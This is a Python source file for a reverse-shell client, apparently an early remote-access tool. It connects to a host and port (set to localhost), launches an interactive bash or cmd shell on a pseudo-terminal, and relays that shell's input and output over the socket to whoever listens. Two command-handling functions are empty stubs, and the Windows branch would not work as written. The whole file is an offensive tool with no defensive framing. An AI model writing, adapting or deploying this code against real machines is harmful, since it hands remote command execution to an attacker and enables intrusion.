import socket
import os
import subprocess
import time
import multiprocessing
import select
import sys
import json

HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
PORT = 65432      # Port to listen on (non-privileged ports are > 1023)

def openShellLinux():

    import pty
    def readOutput(processMasterPointer):
        x = ""
        x += os.read(processMasterPointer, 1026).decode("UTF-8")
        return x.encode()

    class listener(multiprocessing.Process):

        def __init__(self, clientsocket, master):
            multiprocessing.Process.__init__(self)
            self.clientsocket = clientsocket
            self.master = master

        def run(self):
            i = 0
            while True:
                r, w, e = select.select([ self.master ], [], [], 0)
                if self.master in r:
                    returnData = readOutput(self.master)
                    self.clientsocket.sendall(returnData)
                    time.sleep(.001)
                else:
                    pass

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as clientsocket:
        clientsocket.connect((HOST, PORT))
        clientsocket.send("Client connected\n".encode())
        master, slave = pty.openpty()
        command = []
        if (sys.platform == "linux"):
            command = ["/bin/bash", "-i"]
        elif sys.platform == "windows":
            command = ["cmd", "/K"]
        process = subprocess.Popen(command, stdin=slave, stdout=slave, stderr=slave)
        os.close(slave)

        prc = listener(clientsocket, master)
        prc.start()

        while True:
            data = clientsocket.recv(1024).decode("UTF-8")
            if not data:
                print("Connection interrupted")
                break
            else:
                os.write(master, data.encode())
                time.sleep(0.001)

def parseCommand(rawCommand):
    pass

def executeCommand(command):
    pass

def commandLoop():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as clientsocket:
        clientsocket.connect((HOST, PORT))
        clientsocket.send("Client connected\n".encode())

        while True:
            data = clientsocket.recv(1024).decode("UTF-8")
            if not data:
                print("Connection interrupted")
                break
            else:
                print(data)
                time.sleep(0.001)



def main():
   openShellLinux()

if __name__ == "__main__":
    main()
